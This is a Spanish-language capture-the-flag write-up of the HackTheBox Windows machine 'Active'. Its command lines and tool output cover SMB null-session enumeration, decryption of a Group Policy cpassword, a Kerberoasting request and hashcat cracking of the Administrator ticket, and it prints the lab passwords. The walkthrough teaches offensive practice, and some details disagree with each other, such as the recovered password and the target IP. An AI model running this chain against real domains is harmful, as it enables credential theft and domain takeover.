---
layout: single
title: "Machines - Active (HTB)"
author_profile: true
published: true
toc: true
toc_sticky: true
comments: true
---

Las máquinas (de HackTheBox) son retos gamificados enfocados a __Red Team__ o por lo menos, __seguridad ofensiva__, donde tendrás que intentar __tomar control total__ de la máquina que tengas adelante abusando de vulnerabilidades para Obtener un _Foothold_, y luego seguir con generalmente, _movimiento lateral_ y finalmente, la _escalada de privilegios_; Estos laboratorios son especialmente útiles para probar conceptos de seguridad ofensiva ya que tendrás que abusar de ellos para seguir avanzando.

![UTMP]({{ "/images/Active/logo.png" | relative_url }}){: .align-center}


## Resumen Active

Esta máquina Windows sencillita, se utilizan los siguientes conceptos/path de ataque.

1. __Enumeración General__ Reconocimiento inical, el pan de cada día.
2. __Enumeración SMB__ Enumeramos SMB para buscar archivos interesantes.
3. __GPP Passwords__ Encontramos un archivo con una contraseña GPP que podemos desencriptar.
4. __Kerberoasting__ Buscamos SPN y encontramos una cuenta interesante para intentar kerberoasting.
5. __Desencriptado de contraseña__ Para obtener la contraseña de la cuenta asociada.

Como puede verse, es relativamente sencillo pero se tocan varios conceptos y malas configuraciones comunes en AD que siempre vale la pena buscar.

## Laboratorio

### Escaneo Inicial

Como siempre, iniciamos nuestra fase de escaneo con `nmap` con el siguiente arreglo:

```bash
nmap -p- --min-rate 5000 -n -Pn 10.129.7.199 -oG allports
```

* `-p-` Indica el escaneo de los 65,535 puertos
* `--min-rate 5000` Indica la velocidad de transmisión de paquetes (a una tasa mínima de 5,000 paquetes por segundo)
* `-n` Deshabilita la resolución DNS de la IP
* `-Pn` Deshabilita el reconocimiento con icmp que realiza `nmap` para determinar si el host está activo o no
* `10.10.11.82` La IP objetivo
* `-oG allports` Indica un archivo de salida en formato grepeable (facilita mucho el utilizar bash para la extracción de información del archivo)

Los resultados del escaneo, nos van mostrando algunos puertos de interés:

```js
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-31 20:17 CST
Nmap scan report for 10.129.7.199
Host is up (0.11s latency).
Not shown: 65393 filtered tcp ports (no-response), 138 closed tcp ports (conn-refused)
PORT    STATE SERVICE
53/tcp  open  domain
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

Confirmando la idea de que es un Windows (típicos puertos de SMB, RPC y del netBIOS) y el puerto 53/TCP es un indicador fuerte que se trate del DC (No es definitivo, pero es un indicador que es común en ese componente); pero bueno, sin saltar a conclusiones y continuando con nuestra enumeración, ejecutamos ahora el siguiente escaneo para conocer las versiones de los protocolos dentro de la máquina:

```bash
nmap -p 53,135,139,445 -sCV -n -Pn 10.129.7.199 -oN OpenṔorts
```

* `-p22,8000` Limita el escaneo a sólo estos 2 puertos
* `-sCV` Son 2 flags combinadas de nmap (-sC) para la ejecución de scripts por defecto de nmap (mayor información) y (-sV) para determinar la versión del servicio
* `-oN OpenPorts` Indica que el output del comando lo reporte en un formato nmap, la salida de lo que veas en consola será lo que verás en el archivo.

Terminando la ejecución veremos los siguientes detalles:

```js
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-31 20:19 CST
Nmap scan report for 10.129.7.199
Host is up (0.20s latency).

PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-02-01T02:19:54
|_  start_date: 2026-02-01T01:54:07
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.07 seconds
```

Lo primero que salta a la vista, es la versión de Windows detectada (Win Server 2008 R2), lo que podemos intentar a continuación __CASI__ instantaneamente es EternalBlue, la ventaja principal de esta opción es que podemos ver si es vulnerable:

Accediendo a `msfconsole`, buscamos `MS17-010`, el identificador de Eternal Blue; cuando hayamos llenado los detalles, podemos utilizar `check` o bien `run` pero de ambos obtendremos el mismo resultado:

```js
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> run
[*] Started reverse TCP handler on 10.10.15.135:11603 
[*] 10.129.7.199:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[-] 10.129.7.199:445      - An SMB Login Error occurred while connecting to the IPC$ tree.
[*] 10.129.7.199:445      - Scanned 1 of 1 hosts (100% complete)
[-] 10.129.7.199:445 - The target is not vulnerable.
```

Sin más que quejarse por intentar la vía más fácil, intentamos enumerar SMB `smbmap` con credenciales vacías (una mala configuración común):

```js
smbmap -u '' -p '' -H 10.129.7.199
[+] IP: 10.129.7.199:445        Name: 10.129.7.199
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share
        Users                                                   NO ACCESS
```

Ese __READ ONLY__ es una buena señal (al menos para nosotros), podemos tirar de algunas herramientas desde aquí; si queremos algo más "manual" podemos utilizar `smbclient` y enumerar cada share; pero por sencillez, podemos utilizar el módulo `spider_plus` de `netexec`:

```js
nxc smb 10.129.7.199 -u '' -p '' -M spider_plus
```

```JS
SMB         10.129.7.199    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.7.199    445    DC               [+] active.htb\:
SPIDER_PLUS 10.129.7.199    445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.7.199    445    DC               [*]  DOWNLOAD_FLAG: False
<SNIP>                                                            
SPIDER_PLUS 10.129.7.199    445    DC               [+] Saved share-file metadata to "/home/n1c37ry05/.nxc/modules/nxc_spider_plus/10.129.7.199.json".
```

En nuestra salida, se nos mostrará un archivo `json` que contendrá las rutas de los archivos encontrados; en ella encontramos una en particular interesante:

```js
<SNIP>
active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
<SNIP>
```

El archivo __Groups.xml__ es un archivo generado por windows cuando un administrador utiliza las _Preferencias de Directiva de Grupo_ para crear un usuario local, cambiar una contraseña o añadir usuarios a un grupo local en los equipos de un dominio; este archivo por lo general se guarda en __SYSVOL__ pero en este caso particular, nos está permitiendo la lectura (Anónima, que es lo que nos está introduciendo una vulnerabilidad).

Este archivo, en versiones antiguas, contenía un campo crítico, llamado `cpassword` el cual es la contraseña de la cuenta gestionada en el archivo, cifrada en _AES_; Sonaría que es seguro... ¿No?, el problema fue que Microsoft __publicó la clave simétrica estática utilizada para cifrar y descifrar estas contraseñas en la documentación__. Entonces, el cifrado terminó siendo inutil.

Sabiendo esto, existen herramientas que nos sirven para extraer esta contraseña; desde modulos en powersploit como herramientas en nuestro linux. Primero que nada, descargamos el archivo con `netexec` o bien, con `smbclient`

```js
nxc smb 10.129.7.199 -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
```

Y revisamos el archivo:

```js
<SNIP>
fullName="" description="" cpassword="edBSHOwhZLTj/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGmeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVoQ" changeLogon="0" noChange=
<SNIP>
```

Y utilizamos `gpp-decryṕt` para obtener la contraseña de la cuenta del archivo (`SVC_TGS`)

```js
> gpp-decrypt edBSHOwhZLTj/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGmeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVoQ
GPPStillStrong2k19
```

Ahora, con la cuenta y la contraseña podemos autenticarnos otra vez ante el DC, esta vez, para utilizar el colector de bloodhound y visualizar de forma más cómoda el equipo o las posibles vías de entrada:

```js
nxc ldap 10.129.7.199 -u 'SVC_TGS' -p 'GPPStillStrong2k19' -d active.htb --dns-server 10.129.7.199 --bloodhound --collection All 
```

```bash
LDAP        10.129.7.199    389    DC               [*] Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.7.199    389    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
LDAP        10.129.7.199    389    DC               Resolved collection methods: session, rdp, container, acl, trusts, objectprops, dcom, group, localadmin, psremote
LDAP        10.129.7.199    389    DC               Done in 0M 30S
LDAP        10.129.7.199    389    DC               Compressing output into /home/n1c37ry05/.nxc/logs/DC_10.129.7.199_2026-02-01_021817_bloodhound.zip
```

Desde la GUI en `Bloodhound`, hacemos una pequeña búsqueda de nuestro usuario; sus grupos pertenecientes... pero no encontramos demasiado; el siguiente paso, es buscar cuentas con __SPNs__ (_Service Principal Names_) Esto es estandard, ya que ahora somos usuarios autenticados y cualquiera, puede pedir esta información, para intentar un __kerberoasting__

En un entorno de AD, nosotros podemos crear un servicio, por cualquier razón, y este servicio (El __SPN__) por lo general está vinculado a una cuenta, entonces, cuando se utiliza el servicio, estás pidiendo a grandes razgos, permiso al emisor de Kerberos (El poderosísimo __KDC__) y él te da un Ticket, para que puedas usar este servicio (Específicamente un TGS), Este ticket, __está cifrado con el hash de la contraseña de la cuenta de servicio__. Nosotros, al tener un ticket de este tipo, podemos tratar de encontrar la contraseña (el hash en realidad) con el que fue encriptado el ticket, entonces, dependerá de qué tan segura es realmente la contraseña.

Para buscar cuentas Kerberoasteables, utilizamos la siguiente query de Cypher:

```js
MATCH (n:User)WHERE n.hasspn=true
RETURN n
```

Y nos devuelve:

![UTMP]({{ "/images/Active/SPNs-Names.png" | relative_url }}){: .align-center}

Desde el Administrator aquí ya levanta sospechas; ahora, sabiendo que tiene vinculada un SPN, utilizamos `impacket-GetUserSPNs` para hacer el request del TGS:

```js
impacket-GetUserSPNs -dc-ip 10.129.9.79 -target-domain ACTIVE.HTB ACTIVE.HTB/SVC_TGS:GPPStillStrong2k19 -request
```

En pantalla nos mostrará el TGS:

![UTMP]({{ "/images/Active/SPNs.png" | relative_url }}){: .align-center}

Ahora, lo copiamos y pegamos en un archivo para utilizar `hashcat` con `rockyou.txt` y tratar de desencriptarlo:

```bash
hashcat tgs /usr/share/wordlists/rockyou.txt

<SNIP>
13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts 
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
<SNIP>

$krb5tgs$23$*Administrator$ACTIVE.HTB$ACTIVE.HTB/Administrator*$865055e147c842401cf58b13f0391bda$4d849578c9f03bfea0eb97f023db3af3a0ab3188b84d3cfe14f9a94445758ef07908fa217b5aa5fe79f047d59bf93302a41ad361bc55e<SNIP!>0744e5d990da64b4bf4256f:Ticketmaster1978

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)

```

Obteniendo así la contraseña de la cuenta Administrador!


###### Agradecimiento

Si lees esto, gracias por llegar hasta aquí!, si existen dudas, comentarios y correcciones (que son más que bienvenidas) contáctame con confianza, que siempre he dicho que la ciberseguridad es esfuerzo conjunto. 

_En caso que no los vea, buenos días, buenas tardes y buenas noches. Happy Hacking!._
